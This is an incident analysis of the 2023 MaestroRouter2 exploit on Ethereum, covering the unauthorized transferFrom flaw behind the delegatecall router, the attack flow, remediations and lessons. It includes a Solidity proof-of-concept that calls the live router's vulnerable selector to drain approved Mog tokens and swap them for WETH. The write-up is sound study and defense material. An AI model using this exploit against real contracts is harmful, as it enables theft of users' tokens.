# MaestroRouter2 Unauthorized Token Transfer Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | MaestroRouter2 |
| Date | 2023-10-03 |
| Chain | Ethereum Mainnet |
| Loss | ~280 ETH |
| Attack Type | Unauthorized transferFrom via delegatecall vulnerability (Delegatecall Vulnerability + Unauthorized transferFrom) |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0xce6397e53c13ff2903ffe8735e478d31e648a2c6` |
| Attack Contract | `0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab` |
| Vulnerable Contract | `0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e` (MaestroRouter2) |
| Fork Block | 18,467,805 |

## 2. Vulnerable Code Analysis

`MaestroRouter2` is the router contract for the Maestro trading bot. The function corresponding to selector `0x9239127f` was able to execute `transferFrom()` on arbitrary tokens. Victims who had `approve`d the Router for their tokens were exposed to the risk of the Router transferring their tokens to the attacker.

```solidity
// Vulnerable pattern: transferFrom execution on arbitrary tokens
contract MaestroRouter2 {
    address public logicContract; // 0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a

    // Execute logic contract via delegatecall
    fallback() external payable {
        address impl = logicContract;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// Vulnerable function in the logic contract (selector 0x9239127f)
contract MaestroLogic {
    // Vulnerable: allows transferFrom of victim's tokens to an arbitrary address
    function transferVictimTokens(
        address token,
        address victim,
        address recipient,
        uint256 amount
    ) external {
        // No caller validation
        IERC20(token).transferFrom(victim, recipient, amount);
    }
}
```

**Vulnerability**: MaestroRouter2 is implemented with the delegatecall pattern, and a specific function (`0x9239127f`) in the logic contract was able to `transferFrom()` an arbitrary victim's tokens to an arbitrary recipient. Victims who had approved Mog tokens and others to the Router suffered losses as a result.

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Unauthorized transferFrom via delegatecall vulnerability (Delegatecall Vulnerability + Unauthorized transferFrom)
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xce6397e53c13ff2903ffe8735e478d31e648a2c6]
  │
  ├─1─▶ Query Mog.allowance(victim, MaestroRouter2)
  │      [Mog: 0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a]
  │      Identify victims who approved the Router
  │
  ├─2─▶ Query Mog.balanceOf(victim)
  │      Check victim balances
  │
  ├─3─▶ MaestroRouter2.call(encoded_data)
  │      [MaestroRouter2: 0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e]
  │      Call with function selector 0x9239127f
  │      Encode victim, attacker, amount
  │      → delegatecall → execute logicContract
  │      → Execute Mog.transferFrom(victim, attacker, balance)
  │
  ├─4─▶ Mog.approve(UniRouter, balance)
  │
  ├─5─▶ UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens()
  │      Swap Mog → WETH
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │
  └─6─▶ ~280 ETH profit realized (repeated across multiple victims)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IMaestroRouter {
    // Actual function signature is 0x9239127f
    function transferTokens(address token, address from, address to, uint256 amount) external;
}

contract MaestroRouter2Exploit {
    IMaestroRouter router = IMaestroRouter(0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e);
    IERC20 Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address[] victims; // Victims who approved Mog to the Router

    function testExploit() external {
        for (uint i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = Mog.allowance(victim, address(router));
            uint256 balance = Mog.balanceOf(victim);
            uint256 amount = allowance < balance ? allowance : balance;

            if (amount > 0) {
                // Call vulnerable function — transferFrom victim's Mog to attacker
                (bool success,) = address(router).call(
                    abi.encodeWithSelector(
                        bytes4(0x9239127f),
                        address(Mog),
                        victim,
                        address(this),
                        amount
                    )
                );
                require(success, "Transfer failed");
            }
        }

        // Swap stolen Mog for WETH
        uint256 mogBalance = Mog.balanceOf(address(this));
        Mog.approve(address(uniRouter), mogBalance);

        address[] memory path = new address[](2);
        path[0] = address(Mog);
        path[1] = address(WETH);

        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mogBalance, 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Vulnerable function via delegatecall, unauthorized transferFrom |
| Affected Scope | All users who approved tokens to MaestroRouter2 |
| Explorer | [Etherscan](https://etherscan.io/address/0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e) |

## 6. Security Recommendations

```solidity
// Remediation 1: Access control on the transferFrom function
contract MaestroLogic {
    mapping(address => bool) public authorizedOperators;

    function transferVictimTokens(
        address token,
        address victim,
        address recipient,
        uint256 amount
    ) external {
        // Verify caller is the actual Router contract
        require(authorizedOperators[msg.sender], "Not authorized");
        // Verify victim is the current tx.origin
        require(victim == tx.origin || isApprovedOnBehalf[victim][msg.sender], "Not approved");
        IERC20(token).transferFrom(victim, recipient, amount);
    }
}

// Remediation 2: Validate msg.sender in delegatecall logic
contract MaestroRouter2 {
    function executeWithValidation(address token, address from, address to, uint256 amount) external {
        // Verify from is the same as msg.sender
        require(from == msg.sender, "Can only transfer own tokens");
        IERC20(token).transferFrom(from, to, amount);
    }
}

// Remediation 3: Guide users to revoke approvals (after the fact)
// Instruct users to revoke existing approvals granted to the Router
// Call approve(router, 0)
```

## 7. Lessons Learned

1. **Trading Bot Router Security**: Trading bot routers that receive large volumes of `approve()` calls from users must be thoroughly audited to ensure no vulnerable function exists that could transfer approved tokens to an arbitrary address.
2. **delegatecall + transferFrom Combination**: Because the logic contract executes in the Router's context via delegatecall, any `transferFrom()` call in the logic contract consumes the Router's allowance.
3. **Function Selector Exposure**: Even without a public ABI, function selectors can be extracted from Etherscan transactions to discover vulnerable functions. All external functions must be audited.
4. **Approval Risk**: Unlimited approvals (`approve(router, type(uint256).max)`) mean that if the Router is compromised, all of the relevant tokens in an account can be lost. Approvals should be revoked after use, or at minimum only the required amount should be approved.